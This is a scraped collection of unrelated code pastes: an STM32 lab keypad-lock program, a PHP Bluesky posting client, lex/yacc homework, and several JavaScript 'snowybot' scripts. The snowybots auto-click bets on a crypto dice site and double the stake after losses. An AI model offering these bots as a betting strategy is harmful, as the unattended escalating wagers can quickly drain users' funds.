						TIM8_Stop();
					}
				}
				break;
			/* PWM */
			case TIM8_CH1_PWM:
				StopTIM8_CH1_PWM();
				InitTIM8_CH1_PWM();
				if (msg.len >= 2)
				{
					if (msg.data[1] <= 0x64)
					{
						SetTIM8_CH1_PWM_DutyCycle(msg.data[1]);
					}
					else
					{
						printf(""bad-duty-cycle\n"");
						StopTIM8_CH1_PWM();
					}
				}
				break;
			case SYS_TICK_TIMER:
				SystemTickTimerInit(STRVR, STCTRL);
				break;
			default:
				printf(""Invalid CMD received \n"");
				break;
			}
		}
		break;
	case ADC_DAC:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] == 0x00) /*ADC*/
		{
			if (msg.data[1] > MAX_NR_OF_CHANNELS)
			{
				printf(""bad-channel\n"");
			}
			else if (msg.data[1] < 2 || (msg.data[1] > 3 && msg.data[1] <5) || msg.data[1] > 16)
			{
				U16 adc_value = 0xFFFF;
				ADC_Configure(MODER, ADC_CR1, ADC_CR2);

				adc_value = ADC_SampleChannel(msg.data[1]);
#if ADC_8_BIT
				adc_value &= 0x00FF;
#else
				adc_value &= 0xFFF0;
#endif
				printf(""Channel %d value %d\n"", msg.data[1], adc_value);
				ADC_Stop();
			}
			else
			{
				printf(""Channel %d value %d\n"", msg.data[1], 0xFFFF);
			}
		}
		else if (msg.data[0] == 0x01) /*DAC*/
		{
			if (CyclicMessage_U8 == 0)
			{
				dac_factor = dac_factor * msg.data[1];
				DAC_Configure(dac_hold_value + dac_factor);
			}

			if (CyclicMessage_U8 == 0 || PrintInCycleMode_U8 == 1)
			{

				dac_hold_value = dac_hold_value + dac_factor;
				DAC->DHR12R1 = dac_hold_value & 0x0FFF;

				printf(""Hold Value: %ld \n"", DAC->DHR12R1);
				PrintInCycleMode_U8 = 0;
			}

			if (CyclicMessage_U8 == 0)
			{
				CyclicMessage_U8 = 1;
				InitPeriodicTimer(PERIODIC_TIMER_VALUE_500US_U16);
			}
		}
		else
		{
			printf(""Invalid module\n"");
		}
		break;
	case IRQ:
		if (msg.len < 2)
		{
			printf(""bad-len\n"");
		}
		else if (msg.data[0] != 0x42 && msg.data[0] != 0x43)
		{
			printf(""bad-port\n"");
		}
		else if (((msg.data[0] == 0x42) && (msg.data[1] > 15 || msg.data[1] < 12)) ||
				 ((msg.data[0] == 0x43) && (msg.data[1] > 11 || msg.data[1] < 8)))
		{
			printf(""bad-pin\n"");
		}
		else
		{

			EnableIRQForIO(msg.data[1]);
			printf(""Press the button for port %c, pin %d\n"", msg.data[0], msg.data[1]);
			delayMs(5000);
			DisableIRQForIO(msg.data[1]);
		}
		break;
	case SPI:
		if (msg.len < 1)
		{
			printf(""bad-len\n"");
		}
		else
		{
			LCD_data(msg.data[0]);
		}
		break;
	case I2C:
		if (msg.len < 1)
		{
			printf(""bad-len\n"");
		}
		else
		{
			I16 acc_g[6];
			I2C1_Init(GPIOB_OTYPER, GPIOB_PUPDR, I2C_CR1, I2CC_CCR);
			MPU6050_initialize();
			MPU6050_getMotion6(&acc_g[0], &acc_g[1], &acc_g[2], &acc_g[3], &acc_g[4], &acc_g[5]);
			if(msg.data[0] > 6)
				printf(""sensor return values: %d, %d, %d, %d, %d, %d\n"", acc_g[0], acc_g[1], acc_g[2], acc_g[3], acc_g[4], acc_g[5]);
			else
				printf(""sensor return value: %d\n"", acc_g[msg.data[0]]);
		}
		break;
	default:
		printf(""Invalid ID received \n"");
		break;
	}
}

void writeStringLCD(char *line) {
	for(unsigned int i=0; i < strlen(line); i++)
	{
		LCD_data(line[i]);
	}
}

void newLine(unsigned int size){
	for(unsigned int i=0; i < 40-size; i++)
	{
		LCD_data(' ');
	}
}

void stopProgram(){
	while(1){}
}

int main(void)
{
	U8 status = 0;

	PeriphInit();
	if(SPI_CR1 != 0) {
	   LCD_init(SPI_CR1);
	}

	printf(""Lucrarea 6 interfete seriale \n"");
	printf(""please enter the packet in the following format ID Byte0 Byte1 ... Byte7 \n"");
	
	//RCC->AHB1ENR |= 4; /* porneste semnalul de tact al portului C */
//RCC->AHB1ENR |= 1; /* porneste semnalul de tact al portului A */
//GPIOA->MODER &= ~0x00000C00; /* sterge registrul de mod al portului A */
//GPIOA->MODER |= 0x00000400; /* seteaza modul de iesire al pinului PA5 */
//GPIOC->MODER &= ~0x00030000; /* Seteaza modul de intrare al pinului PC13 */
	
	char startMessageLine1[100] = {'I', 'n', 't', 'r', 'o', 'd', 'u', 'c', 'e', 't', 'i', '\0'}; 
	char startMessageLine2[100] = {'p', 'a', 'r', 'o', 'l', 'a', ':', '\0'}; 
	char buttonMessageLine1[100] = {'1', '\0'}; 
	char buttonMessageLine2[100] = {'2', '\0'}; 
	char buttonMessageLine3[100] = {'3', '\0'}; 
	char buttonMessageLine4[100] = {'4', '\0'};
	char password[100] = {'1', '2', '3', '4'};
	char passwordTry[100];
	char successMessageLine2[100] = {'D', 'E', 'B', 'L', 'O', 'C', 'A', 'T','\0'};
	char wrongPasswordMessageLine1[100] = {'I', 'n', 'c', 'e', 'r', 'c', 'a', 'r', 'i', '\0'};
	char wrongPasswordMessageLine2[100] = {'r', 'a', 'm', 'a', 's', 'e', ':', '\0'};
	char noMoreTriesMessageLine1[100] = {'A', 'i', ' ', 'r', 'a', 'm', 'a', 's', ' ', 'f', 'a', 'r', 'a', '\0'};
	char noMoreTriesMessageLine2[100] = {'i', 'n', 'c', 'e', 'r', 'c', 'a', 'r', 'i', '!', '\0'};
	char unlockStateMessageLine[100] = {'M', 'e', 'r', 'g', 'e', '!', '\0'};
	int k=0;
	int tries=3;
	int unlocked = 0;
	while (1)
	{
		//writeStringLCD(startMessageLine1);
		//newLine(strlen(startMessageLine1));
		//writeStringLCD(startMessageLine2);
		if(strcmp(password, passwordTry) == 0 && !unlocked) {
			LCD_command(1);
			delayMs(10);
			GPIOB->ODR &=  ~0x000000F0;
			writeStringLCD(successMessageLine2);
			unlocked = 1;
			delayMs(500);
			//LCD_command(1);
		} else if(k >= 4 && !unlocked){
			LCD_command(1);
			GPIOB->ODR |=  0x000000F0;
			tries--;
			writeStringLCD(wrongPasswordMessageLine1);
			newLine(strlen(wrongPasswordMessageLine1));
			writeStringLCD(wrongPasswordMessageLine2);
			LCD_data('0' + tries);
			delayMs(500);
			if(tries == 0) {
				LCD_command(1);
				writeStringLCD(noMoreTriesMessageLine1);
				newLine(strlen(noMoreTriesMessageLine1));
				writeStringLCD(noMoreTriesMessageLine2);
				stopProgram();
			} else {
				//GPIOB->ODR &=  ~0x000000F0;
				k=0;
				LCD_command(1);
			}
		}
		
		//if (GPIOC->IDR & 0x2000 && unlocked) 
		//{
			//writeStringLCD(unlockStateMessageLine);
			//delayMs(500);
			//LCD_command(1);
		//}
		
		if (GPIOC->IDR & 0x100 && !unlocked) 
		{
			passwordTry[k] = '1';
			LCD_data('*');
			delayMs(125);
			k++;
		}

			//GPIOA->BSRR = 0x00000020; /* aprinde LED-ul verde */
		if (GPIOC->IDR & 0x200 && !unlocked){
				passwordTry[k] = '2';
				LCD_data('*'); 
				delayMs(125);
				k++;
			}
		
		if (GPIOC->IDR & 0x400 && !unlocked){
				passwordTry[k] = '3';
				LCD_data('*');
				delayMs(125);
				k++;
			}
		
		if (GPIOC->IDR & 0x800 && !unlocked){
				passwordTry[k] = '4';
				LCD_data('*');
				delayMs(125);
				k++;
			}

	}
	
}

/* ISRs */
void TIM2_IRQHandler(void)
{
	TIM2->SR = 0; /* clear UIF */
	TimerCountDown_U16--;
	PrintInCycleMode_U8 = 1; /* time to print */
}

/* Lucrarea 3*/
void TIM3_IRQHandler(void)
{
	if (TIM3->SR & 1)
	{
		TIM3->SR &= ~1;
		timestamp += 40 * factor;
	}
}

void TIM8_CC_IRQHandler(void)
{
	if (TIM8->SR & 8)
	{
		TIM8->SR &= ~8;
		nr_of_pushes += 1;
		capture_time += TIM8->CCR3;
	}
}

void SysTick_Handler(void)
{
	GPIOB->ODR ^= 0x00000020;
}

/* Lucrarea 5 */
void EXTI15_10_IRQHandler(void)
{
	if (EXTI->PR & 0x00000400)
	{						   /* isr on pin 10 */
		EXTI->PR = 0x00000400; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000040;
	}
	else if (EXTI->PR & 0x00000800)
	{						   /* isr on pin 11 */
		EXTI->PR = 0x00000800; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000080;
	}
	else if (EXTI->PR & 0x00001000)
	{						   /* isr on pin 12 */
		EXTI->PR = 0x00001000; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000010;
	}
	else if (EXTI->PR & 0x00002000)
	{						   /* isr on pin 13 */
		EXTI->PR = 0x00002000; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000020;
	}
	else if (EXTI->PR & 0x00004000)
	{						   /* isr on pin 14 */
		EXTI->PR = 0x00004000; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000040;
	}
	else if (EXTI->PR & 0x00008000)
	{						   /* isr on pin 15 */
		EXTI->PR = 0x00008000; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000080;
	}
}

void EXTI9_5_IRQHandler(void)
{
	if (EXTI->PR & 0x000000100)
	{						   /* isr on pin 8 */
		EXTI->PR = 0x00000100; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000010;
	}
	else if (EXTI->PR & 0x00000200)
	{						   /* isr on pin 9 */
		EXTI->PR = 0x00000200; /* clear interrupt pending flag */
		GPIOB->ODR ^= 0x00000020;
	}
}"
CAp4ZPrt,class.Bsky.php untested,mspotilas,PHP,Friday 24th of May 2024 02:08:29 AM CDT,"<?php
    // 2023 by Thomas Nesges 
    // (c) CC-BY

    class Bsky {
        private $username;
        private $password;
        private $xrpcbase;
        private $did;
        private $bearer;
        private $refreshToken;
        public $connected;
        public $handle;
        public $email;
        public $emailConfirmed;
        public $profile_url;
        
        function __construct($username, $password, $xrpcbase='https://bsky.social/xrpc') {
            $this->username = $username;
            $this->password = $password;
            $this->xrpcbase = $xrpcbase;
        }
        
        function connect() {
            $response = $this->xrpc_post('/com.atproto.server.createSession', [
                  ""identifier""  => $this->username,
                  ""password""    => $this->password,
                ]);
            
            $this->did =            $response['did'];
            $this->bearer =         $response['accessJwt'];
            $this->handle =         $response['handle'];
            $this->email =          $response['email'];
            $this->emailConfirmed = $response['emailConfirmed'];
            $this->refreshToken =   $response['refreshJwt'];
            // todo: how do I find the profile url?
            $this->profile_url =    'https://bsky.app/profile/'.$this->handle;
            
            $this->connected = false;
            if($response['_curl']['http_code']==200) {
                $this->connected = true;
            }
            
            return $response;
        }
        
        function post($skeet_text, $languages=['de-DE']) {
            $postfields = [
                ""repo""          => $this->did,
                ""collection""    => ""app.bsky.feed.post"",
                ""record"" => [
                    '$type'     => ""app.bsky.feed.post"",
                    'createdAt' => date(""c""),
                    'text'      => $skeet_text,
                    'langs'     => $languages,
                ]
            ];
            
            
            
            // find links and mark them as app.bsky.richtext.facet#link
            $start = 0; $end = 0;
            preg_match_all('/[$|\W](https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&\/\/=]*[-a-zA-Z0-9@%_\+~#\/\/=])?)/', $skeet_text, $matches, PREG_SET_ORDER);
            foreach($matches as $match) {
                $link = $match[1];
            
                if($link) {
                    $start = strpos($skeet_text, $link, $end);
                    $end = $start + strlen($link);
                
                    $postfields[""record""][""facets""][] = [
                        ""index"" => [
                            'byteStart' => $start,
                            'byteEnd'   => $end,
                        ],
                        ""features"" => [[
                            '$type'     => ""app.bsky.richtext.facet#link"",
                            'uri'       => $link,
                        ]],
                    ];
                    
                    // try to get a card for this link, if we don't already have one
                    if(!isset($postfields[""record""][""embed""])) {
                        $card = $this->card($link);
                        if($card) {
                            $postfields[""record""][""embed""] = $card;
                        }
                    }
                }
                
            }
            // *****START find hashtags
            // https://github.com/bluesky-social/atproto/blob/main/lexicons/app/bsky/richtext/facet.json
            $start = 0; $end = 0;
            preg_match_all('/(#[^\s#]+)/', $skeet_text, $matches, PREG_SET_ORDER);
            foreach($matches as $match) {
                $tag = $match[1];
                if($tag) {
                    $start = strpos($skeet_text, $tag, $end);
                    $end = $start + strlen($tag);
                    $postfields[""record""][""facets""][] = [
                        ""index"" => [
                            'byteStart' => $start,
                            'byteEnd'   => $end,
                        ],
                        ""features"" => [[
                            '$type'     => ""app.bsky.richtext.facet#tag"",
                            'tag'       => substr($tag, 1),
                        ]],
                    ];
                }
            }
            // *****END find hashtags
            
            
            
            // find mentions and mark them as app.bsky.richtext.facet#mention
            $start = 0; $end = 0;
            preg_match_all('#[$|\W](@([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)#', $skeet_text, $matches, PREG_SET_ORDER);
            foreach($matches as $match) {
                $mention = $match[1];
                
                // check if bsky resolves mention as handle
                $response = $this->xrpc_get('/com.atproto.identity.resolveHandle', 'handle='.preg_replace('#@#', '', $mention));
                if($response['_curl']['http_code'] == 200) {
                    $mentioned_did = $response['did'];

                    $start = strpos($skeet_text, $mention, $end ?? 0);
                    $end = $start + strlen($mention);
                    
                    $postfields[""record""][""facets""][] = [
                        ""index"" => [
                            'byteStart' => $start,
                            'byteEnd'   => $end,
                        ],
                        ""features"" => [[
                            '$type'     => ""app.bsky.richtext.facet#mention"",
                            'did'       => $mentioned_did,
                        ]],
                    ];
                }
            }
            
            # print ""postfields: \n""; print json_encode($postfields); print json_last_error_msg(); print ""\n""; exit;
            
            return $this->xrpc_post('/com.atproto.repo.createRecord', $postfields);
        }
        
        function card($url) {
            $doc = new DOMDocument();
            @$doc->loadHTMLFile($url);
            if($doc) {
                $xpath = new DOMXpath($doc);
                $xpath->registerNamespace('og', 'http://ogp.me/ns');
                $xpath->registerNamespace('fb', 'http://ogp.me/ns/fb');
                $xpath->registerNamespace('twitter', 'http://ogp.me/ns/twitter');
                
                $title = $this->nodeValue($xpath, [""//meta[@property='og:title']/@content"", ""//meta[@name='title']/@content"", ""//title"", ""//meta[@property='fb:title']/@content"", ""//meta[@property='twitter:title']/@content""]);
                $description = $this->nodeValue($xpath, [""//meta[@property='og:description']/@content"", ""//meta[@name='description']/@content"", ""//meta[@property='fb:description']/@content"", ""//meta[@property='twitter:description']/@content""]);
                
                // search for a possible image in this set of pathes
                $imgpaths = [""//meta[@property='og:image']/@content"", ""//meta[@property='og:image:url']/@content"", ""//meta[@property='og:image:secure_url']/@content"", ""//meta[@property='fb:image']/@content"", ""//meta[@property='twitter:image']/@content"", ""//link[@rel='icon']/@href""];
                $imgdata = false;
                foreach($imgpaths as $path) {
                    foreach($xpath->query($path) as $node) {
                        $imgurl = mb_convert_encoding($node->nodeValue, 'UTF-8', 'UTF-8');
                        if($imgurl) {
                            // load image
                            $imgdata = @file_get_contents($imgurl);
                            if($imgdata) {
                                // stop after the first loadable image
                                break;
                            }
                        }
                    }
                    if($imgdata) {
                        break;
                    }
                }
                
                if($imgdata) {
                    // max filesize is 976.56 KB
                    if(strlen($imgdata) > 976560) {
                        // resize till it fits
                        $quality = 90;
                        $tmp = sys_get_temp_dir().'/'.basename($img);
                        while(!file_exists($tmp) || filesize($tmp) > 976560 && $quality >= 0) {
                            print ""\nDEBUG resizing $img from "".strlen($imgdata)."" with quality $quality ..\n"";
                            $this->_image_compress($img, $tmp, $quality);
                            print ""DEBUG new size: "".filesize($tmp).""\n"";
                            $quality -= 10;
                        }
                        $imgdata = file_get_contents($tmp);
                        unlink($tmp);
                    }
                    if(strlen($imgdata) <= 976560) {
                        // get mime type
                        $headers = implode(""\n"", $http_response_header);
                        if (preg_match_all(""/^content-type\s*:\s*(.*)$/mi"", $headers, $matches)) {
                            $content_type = end($matches[1]);
                        }
                        // upload image to bsky
                        $response = $this->xrpc_post('/com.atproto.repo.uploadBlob', $imgdata, $content_type);
                        // attach blob data
                        if(isset($response['blob'])) {
                            $thumb = $response['blob'];
                        }
                    }
                } else {
                    print ""\nDEBUG no image found\n"";
                }
                
                if(isset($thumb)) {
                    return [
                        '$type' => ""app.bsky.embed.external"",
                        'external' => [
                            ""uri"" => $url,
                            ""title"" => html_entity_decode(strip_tags(mb_convert_encoding($title, 'UTF-8', 'UTF-8'))),
                            ""description"" => html_entity_decode(strip_tags(mb_convert_encoding($description, 'UTF-8', 'UTF-8'))),
                            ""thumb"" => $thumb
                        ]
                    ];
                }
            }
            return false;
        }
        
        function nodeValue($xpath, $paths) {
            foreach($paths as $path) {
                $nodes = $xpath->query($path);
                if($nodes[0]) {
                    return mb_convert_encoding($nodes[0]->nodeValue, 'UTF-8', 'UTF-8');
                }
            }
            return false;
        }
        
        function getProfile($actor_id) {
            return $this->xrpc_get('/app.bsky.actor.getProfile', 'actor='.$actor_id);
        }
                
        function xrpc_post($lexicon, $postfields=[], $content_type='application/json') {
            $httpheader = [ 'Content-Type: '.$content_type ];
            // if we have auth, send auth
            if(isset($this->bearer)) {
                $httpheader[] = 'Authorization: Bearer '.$this->bearer;
            }
            
            $curl = curl_init();
            curl_setopt_array($curl, [
                CURLOPT_URL             => $this->xrpcbase.$lexicon,
                CURLOPT_RETURNTRANSFER  => true,
                CURLOPT_ENCODING        => '',
                CURLOPT_MAXREDIRS       => 10,
                CURLOPT_TIMEOUT         => 0,
                CURLOPT_FOLLOWLOCATION  => true,
                CURLOPT_HTTP_VERSION    => CURL_HTTP_VERSION_1_1,
                CURLOPT_POST            => true,
                CURLOPT_CUSTOMREQUEST   => 'POST',
                CURLOPT_POSTFIELDS      => is_array($postfields) ? json_encode($postfields) : $postfields,
                CURLOPT_HTTPHEADER      => $httpheader,
                CURLOPT_HEADER          => true,
            ]);
            $response = curl_exec($curl);
            
            $header_size = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
            $header = substr($response, 0, $header_size);
            $response = substr($response, $header_size);
            
            $curl_info = curl_getinfo($curl);
            curl_close($curl);
            
            $response = json_decode($response, TRUE);
            $response['_curl'] = $curl_info;
            $response['_header'] = $header;
            return $response;
        }
        
        function xrpc_get($lexicon, $params='') {
            $httpheader = [ 'Content-Type: application/json' ];
            // if we have auth, send auth
            if(isset($this->bearer)) {
                $httpheader[] = 'Authorization: Bearer '.$this->bearer;
            }

            $curl = curl_init();
            curl_setopt_array($curl, [
                CURLOPT_URL             => $this->xrpcbase.$lexicon.'?'.$params,
                CURLOPT_RETURNTRANSFER  => true,
                CURLOPT_ENCODING        => '',
                CURLOPT_MAXREDIRS       => 10,
                CURLOPT_TIMEOUT         => 0,
                CURLOPT_FOLLOWLOCATION  => true,
                CURLOPT_HTTP_VERSION    => CURL_HTTP_VERSION_1_1,
                CURLOPT_HTTPHEADER      => $httpheader,
            ]);
            $response = curl_exec($curl);
            $curl_info = curl_getinfo($curl);
            curl_close($curl);
            
            $response = json_decode($response, TRUE);
            $response['_curl'] = $curl_info;
            return $response;
        }
        
        function _image_compress($file, $compressed, $quality) {
            $info = getimagesize($file);
            if ($info['mime'] == 'image/jpeg') {
                $image = imagecreatefromjpeg($file);
            } else if ($info['mime'] == 'image/gif') {
                $image = imagecreatefromgif($file);
            } else if ($info['mime'] == 'image/png') {
                $image = imagecreatefrompng($file);
            }
            imagejpeg($image, $compressed, $quality);
            
            return $compressed;
        }

    }
?>"
0eH8itUL,amazing snowybot 3.14,coinwalk,JavaScript,Friday 24th of May 2024 01:54:39 AM CDT,"var OriginalBalanCe = parseFloat(document.getElementById('pct_balance').value);
var BaseBet = 0.0001;
var NexTBet = BaseBet;
var tens = (BaseBet*10);
var fives = (BaseBet*4.9);
var sevens = (BaseBet*6.9);
var eights = (BaseBet*7.9);
var winnerdinner = (OriginalBalanCe*24);
var snowzy = ((Math.floor(OriginalBalanCe/tens))*tens);
var loL = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowy = 0;
var fart = 1;
var BalanCe = OriginalBalanCe;
 
function go(){
BalanCe = document.getElementById('pct_balance').value;
var dog = Number((BalanCe-OriginalBalanCe).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((BalanCe>(((Math.floor(BalanCe/tens))*tens)+sevens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+eights))&&(BalanCe!=snowy)){
    NexTBet = NexTBet*2;
    snowy = parseFloat(BalanCe);
}
if ((BalanCe<(snowzy-tens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))&&(BalanCe<OriginalBalanCe)){
    NexTBet = BaseBet;
    snowy = 0;
    fart = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
    loL = ((Math.floor(OriginalBalanCe/tens))*tens);
}
if ((BalanCe<(snowzy-tens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))&&(BalanCe>=OriginalBalanCe)){
    NexTBet = BaseBet;
    snowy = 0;
    fart = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if ((BalanCe>(loL+(tens*fart)))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){ 
    fart = 1;
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
    loL = ((Math.floor(BalanCe/tens))*tens);
}
if (BalanCe>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((NexTBet*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 112);
}
go();"
6eQJcfkc,robo manual snowybot 100fold,coinwalk,JavaScript,Friday 24th of May 2024 12:45:09 AM CDT,"var OriginalBalanCe = parseFloat(document.getElementById('pct_balance').value);
var BaseBet = Number((OriginalBalanCe/2400).toFixed(8));
var NexTBet = BaseBet;
var tens = (BaseBet*10);
var fives = (BaseBet*4.9);
var sevens = (BaseBet*6.9);
var eights = (BaseBet*7.9);
var winnerdinner = 128000;
var snowzy = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowy = 0;
var BalanCe = OriginalBalanCe;
 
function go(){
BalanCe = document.getElementById('pct_balance').value;
var dog = Number((BalanCe-OriginalBalanCe).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((BalanCe>(((Math.floor(BalanCe/tens))*tens)+sevens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+eights))&&(BalanCe!=snowy)){
    NexTBet = NexTBet*2;
    snowy = parseFloat(BalanCe);
}
if ((BalanCe<(snowzy-tens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))){
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if ((BalanCe>(snowzy+(tens*3)))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if (BalanCe>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((NexTBet*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 112);
}
go();"
zHRg83na,run.sh,bokunda,Bash,Friday 24th of May 2024 12:38:35 AM CDT,"lex <ime-prog-lex>.l
yacc ‚Äìd <ime-prog-yacc>.y (-v -d za debug)
gcc ‚Äìo <ime-prog> lex.yy.c y.tab.c -lfl
./<ime-prog>"
2jgX0Qfp,lex.l,bokunda,C,Friday 24th of May 2024 12:38:07 AM CDT,"%{
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include ""y.tab.h""
int yyline;
%}

%%

[A-Za-z""_""]{1,} {
    strcpy(yylval.ctekst, yytext);
    return TEKST;
}

""0.""[0-9]{1} {
    yylval.ckriterijum = atof(yytext);
    return KRITERIJUM;
}

""*""|""+""|""-""|""?"" {
    
    if (yytext[0] == '*') {
        yylval.cocena = 3;
    }
    else if (yytext[0] == '+') {
        yylval.cocena = 2;
    }
    else if (yytext[0] == '-') {
        yylval.cocena = 1;
    }
    else {
        yylval.cocena = 0;
    }
    
    return OCENA;
}

""###"" {
    return TARABE;
}

""pr:"" {
    return PR;
}

"" "" {

}

\n {
    yyline++;
}

. {
    return yytext[0];
}

%%"
YBHeNdf6,yacc.c,bokunda,C,Friday 24th of May 2024 12:37:42 AM CDT,"%{
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    extern int yyline;
    int yylex();
    //int yydebug = 1;

    typedef struct proizvodMetaItem {
        char naziv[100];
        float vrednost;
    } PROIZVOD_META_ITEM;

    typedef struct ocenaMetaItem {
        char nazivProizvoda[100];
        char kriterijum[100];
        float ocena;
    } OCENA_META;

    typedef struct proizvodMeta {
        char naziv[100];
        PROIZVOD_META_ITEM items[100];
        int totalItems;
    } PROIZVOD_META;

    PROIZVOD_META proizvodi[100];
    OCENA_META ocene[100];

    int rbProizvoda = 0;
    int rbKriterijuma = 0;
    int rbOcene = 0;    
    int globalIndexProizvoda = 0;

    void handleProizvod(char *naziv)
    {
        strcpy(proizvodi[rbProizvoda].naziv, naziv);
        rbProizvoda++;
        rbKriterijuma = 0;
    }

    void handleDetaljiProizvoda(char *nazivKriterijuma, float vrednostKriterijuma)
    {
        strcpy(proizvodi[rbProizvoda].items[rbKriterijuma].naziv, nazivKriterijuma);
        proizvodi[rbProizvoda].items[rbKriterijuma].vrednost = vrednostKriterijuma;

        rbKriterijuma++;
        proizvodi[rbProizvoda].totalItems = rbKriterijuma;
    }

    void handleKomentar(char *s)
    {
        for(int i = 0; i < rbProizvoda; i++)
        {
            if (strcmp(proizvodi[i].naziv, s) == 0)
            {
                globalIndexProizvoda = i;
            }
        }
    }

    void handleOcena(char *kriterijum, float ocena)
    {
        strcpy(ocene[rbOcene].nazivProizvoda, proizvodi[globalIndexProizvoda].naziv);
        strcpy(ocene[rbOcene].kriterijum, kriterijum);
        ocene[rbOcene].ocena = ocena;

        rbOcene++;
    }

    float getProsecnaOcena(char *nazivProizvoda, char *nazivKriterijuma, float vaznostKriterijuma)
    {
        float brOcena = 0;
        float sumaOcena = 0;
        for (int i = 0; i < rbOcene; i++)
        {
            if (strcmp(nazivProizvoda, ocene[i].nazivProizvoda) == 0 && strcmp(nazivKriterijuma, ocene[i].kriterijum) == 0)
            {
                sumaOcena += ocene[i].ocena;
                brOcena++;
            }
        }

        return vaznostKriterijuma / brOcena * sumaOcena;
    }
%}

%union {
    int cocena;
    char ctekst[100];
    float ckriterijum;
}

%token <cocena> OCENA <ctekst> TEKST <ckriterijum> KRITERIJUM TARABE PR
%start program

%%

program : proizvodi TARABE komentari
proizvodi : proizvod proizvodi | proizvod
proizvod : TEKST ':' '(' detaljiproizvoda ')' { handleProizvod($1); }
detaljiproizvoda 
    : TEKST ':' KRITERIJUM ',' detaljiproizvoda { handleDetaljiProizvoda($1, $3); } 
    | TEKST ':' KRITERIJUM { handleDetaljiProizvoda($1, $3); } 
komentari : komentar komentari | komentar
komentar: PR TEKST ',' TEKST ':' TEKST ':' detaljiKomentara { handleKomentar($6); }
detaljiKomentara
    : TEKST OCENA ',' detaljiKomentara { handleOcena($1, $2); }
    | TEKST OCENA { handleOcena($1, $2); }

%%



int yyerror(char *s) {
    printf(""Greska %s na liniji %d\n"", s, yyline + 1);
}

int main(void) {

    if (yyparse() == 0) {
        printf(""Parsiranje uspesno!\n"");
    }
    else {
        printf(""Parsiranje nije uspesno!\n"");
    }

    for (int i = 0; i < rbProizvoda; i++)
    {
        printf(""Tip proizvoda %s kriterijumi:\n"", proizvodi[i].naziv);
        for (int j = 0; j < proizvodi[i].totalItems; j++)
        {
            printf(""kriterijum: %s, prosecna ocena %f\n"", 
                proizvodi[i].items[j].naziv,
                getProsecnaOcena(proizvodi[i].naziv, proizvodi[i].items[j].naziv, proizvodi[i].items[j].vrednost));
        }
    }

    return 0;
}"
Rau5LsFE,amazing snowybot,coinwalk,JavaScript,Thursday 23rd of May 2024 11:44:49 PM CDT,"var OriginalBalanCe = parseFloat(document.getElementById('pct_balance').value);
var BaseBet = Number((OriginalBalanCe/240).toFixed(8));
var NexTBet = BaseBet;
var tens = (BaseBet*10);
var fives = (BaseBet*4.9);
var sevens = (BaseBet*6.9);
var eights = (BaseBet*7.9);
var winnerdinner = 128000;
var snowzy = ((Math.floor(OriginalBalanCe/tens))*tens);
var snowy = 0;
var BalanCe = OriginalBalanCe;
 
function go(){
BalanCe = document.getElementById('pct_balance').value;
var dog = Number((BalanCe-OriginalBalanCe).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((BalanCe>(((Math.floor(BalanCe/tens))*tens)+sevens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+eights))&&(BalanCe!=snowy)){
    NexTBet = NexTBet*2;
    snowy = parseFloat(BalanCe);
}
if ((BalanCe<(snowzy-tens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+fives))){
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if ((BalanCe>(snowzy+tens))&&(BalanCe<(((Math.floor(BalanCe/tens))*tens)+sevens))){
    NexTBet = BaseBet;
    snowy = 0;
    snowzy = ((Math.floor(BalanCe/tens))*tens);
}
if (BalanCe>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((NexTBet*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 112);
}
go();"
nKz0bdYn,amazing snowybot 3.14,coinwalk,JavaScript,Thursday 23rd of May 2024 11:20:21 PM CDT,"var OriginalBalanCe = parseFloat(document.getElementById('pct_balance').value);
var BaseBet = Number((OriginalBalanCe/240).toFixed(8));
var NexTBet = BaseBet;
var tens = (BaseBet*10);
var fives = (BaseBet*4.9);
